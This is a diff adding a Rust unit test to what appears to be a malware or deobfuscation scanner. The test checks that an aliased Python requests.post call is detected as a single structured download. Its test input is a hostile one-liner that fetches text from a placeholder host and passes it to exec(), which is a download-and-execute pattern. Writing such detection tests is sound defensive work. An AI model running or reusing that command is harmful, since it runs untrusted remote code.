@@ -15281,6 +15281,38 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_assigned_post_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; send = requests.post; exec(send('https://py.example/assigned-post').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/assigned-post" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned requests.post alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-post")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned requests.post alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_get_variable_url_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
